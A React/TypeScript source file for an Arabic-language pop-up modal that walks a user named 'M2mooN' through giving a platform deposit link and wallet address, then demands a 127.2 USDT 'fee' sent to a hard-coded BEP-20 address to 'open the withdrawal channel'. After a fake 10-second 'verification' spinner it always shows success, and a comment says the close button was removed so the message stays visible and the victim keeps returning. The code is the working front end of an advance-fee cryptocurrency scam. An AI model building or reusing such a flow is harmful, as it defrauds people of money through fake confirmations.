
import React, { useState, useEffect } from 'react';

interface ModalProps {
  onClose: () => void;
}

const Modal: React.FC<ModalProps> = ({ onClose }) => {
  const [step, setStep] = useState(1);
  const [platformLink, setPlatformLink] = useState('');
  const [walletAddress, setWalletAddress] = useState('');

  // Handle the 10-second delay for Step 5
  useEffect(() => {
    if (step === 5) {
      const timer = setTimeout(() => {
        setStep(6);
      }, 10000); // 10 seconds
      return () => clearTimeout(timer);
    }
  }, [step]);

  const nextStep = () => setStep((prev) => prev + 1);

  const renderContent = () => {
    switch (step) {
      case 1:
        return (
          <div className="flex flex-col items-center text-center py-4" dir="rtl">
            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mb-4">
              <svg className="w-10 h-10 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
              </svg>
            </div>
            <h2 className="text-xl font-bold text-gray-800 mb-2">أهلاً بك M2mooN</h2>
            <p className="text-gray-600 mb-6 leading-relaxed">
              تم حل أمر المهام، اضغط التالي وقم بوضع رابط المنصة mini pro لقسم الإيداع حصراً.
            </p>
            <button 
              onClick={nextStep}
              className="w-full py-3 bg-gradient-to-r from-[#8a2230] to-[#4b1b23] text-white rounded-xl font-bold shadow-lg active:scale-95 transition-transform"
            >
              التالي
            </button>
          </div>
        );
      case 2:
        return (
          <div className="flex flex-col items-center text-center py-4" dir="rtl">
            <h2 className="text-lg font-bold text-gray-800 mb-4">رابط منصة mini pro</h2>
            <p className="text-sm text-gray-500 mb-4">يرجى إدخال رابط المنصة لقسم الإيداع:</p>
            <input 
              type="text"
              value={platformLink}
              onChange={(e) => setPlatformLink(e.target.value)}
              placeholder="https://mini-pro.com/deposit..."
              className="w-full p-3 border border-gray-200 rounded-xl mb-6 focus:outline-none focus:ring-2 focus:ring-[#8a2230] text-right"
            />
            <button 
              onClick={nextStep}
              disabled={!platformLink}
              className={`w-full py-3 ${platformLink ? 'bg-gradient-to-r from-[#8a2230] to-[#4b1b23]' : 'bg-gray-300 cursor-not-allowed'} text-white rounded-xl font-bold shadow-lg active:scale-95 transition-transform`}
            >
              التالي
            </button>
          </div>
        );
      case 3:
        return (
          <div className="flex flex-col items-center text-center py-4" dir="rtl">
            <h2 className="text-lg font-bold text-gray-800 mb-4">عنوان محفظة BEP-20</h2>
            <p className="text-sm text-gray-500 mb-4">يرجى وضع رابط محفظة BEP-20 (USDT) الخاصة بك:</p>
            <input 
              type="text"
              value={walletAddress}
              onChange={(e) => setWalletAddress(e.target.value)}
              placeholder="0x..."
              className="w-full p-3 border border-gray-200 rounded-xl mb-6 focus:outline-none focus:ring-2 focus:ring-[#8a2230] text-right"
            />
            <button 
              onClick={nextStep}
              disabled={!walletAddress}
              className={`w-full py-3 ${walletAddress ? 'bg-gradient-to-r from-[#8a2230] to-[#4b1b23]' : 'bg-gray-300 cursor-not-allowed'} text-white rounded-xl font-bold shadow-lg active:scale-95 transition-transform`}
            >
              التالي
            </button>
          </div>
        );
      case 4:
        return (
          <div className="flex flex-col items-center text-center py-4" dir="rtl">
            <h2 className="text-xl font-bold text-gray-800 mb-4">أهلاً بك M2mooN</h2>
            <p className="text-gray-600 text-[14px] mb-4 leading-relaxed">
              بقي أمر إيداع مبلغ <span className="font-bold text-[#8a2230]">127.2 عملة USDT BEP-20</span> لفتح قناة السحب.
            </p>
            <div className="bg-red-50 p-3 rounded-lg border border-red-100 mb-4">
              <p className="text-[12px] text-red-600 font-medium">
                هذه الضريبة هي أجور منصتنا وليس لها أي صلة بمنصة mini pro.
              </p>
            </div>
            <div className="w-full bg-gray-100 p-3 rounded-xl mb-2 text-center break-all relative group">
              <p className="text-[11px] text-gray-400 mb-1">يرجى التحويل إلى العنوان التالي:</p>
              <code className="text-[13px] font-mono font-bold text-gray-700">0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d</code>
            </div>
            <button 
              onClick={nextStep}
              className="w-full py-3 mt-4 bg-gradient-to-r from-[#8a2230] to-[#4b1b23] text-white rounded-xl font-bold shadow-lg active:scale-95 transition-transform"
            >
              تم الإيداع
            </button>
          </div>
        );
      case 5:
        return (
          <div className="flex flex-col items-center text-center py-8" dir="rtl">
            <div className="w-16 h-16 border-4 border-[#8a2230] border-t-transparent rounded-full animate-spin mb-6"></div>
            <h2 className="text-lg font-bold text-gray-800">الرجاء الانتظار...</h2>
            <p className="text-gray-500 mt-2">جاري التأكد من عملية الإيداع، قد يستغرق هذا بضع دقائق.</p>
          </div>
        );
      case 6:
        return (
          <div className="flex flex-col items-center text-center py-6" dir="rtl">
            <div className="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center mb-6 shadow-lg animate-bounce">
              <svg className="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7"></path>
              </svg>
            </div>
            <h2 className="text-xl font-bold text-green-600 mb-4">تم التأكد بنجاح</h2>
            <div className="bg-gray-50 p-5 rounded-2xl border border-gray-100 mb-2">
              <p className="text-gray-700 text-[15px] leading-relaxed font-medium">
                سيتم فتح قناة السحب خلال 48 ساعة. 
                <br />
                <span className="text-[#8a2230] block mt-2">قم بالرجوع كل ساعة للتأكد، ستختفي هذه الرسالة عند فتح قناة السحب.</span>
              </p>
            </div>
            {/* The "حسناً" button has been removed to keep the notification visible */}
          </div>
        );
      default:
        return null;
    }
  };

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
      {/* Overlay with 2px blur */}
      <div className="absolute inset-0 bg-black/40 backdrop-blur-[2px]"></div>
      
      {/* Modal Container */}
      <div className="relative w-full max-w-[340px] bg-white rounded-[24px] shadow-2xl overflow-hidden p-6 animate-in fade-in zoom-in duration-300">
        {renderContent()}
      </div>
    </div>
  );
};

export default Modal;
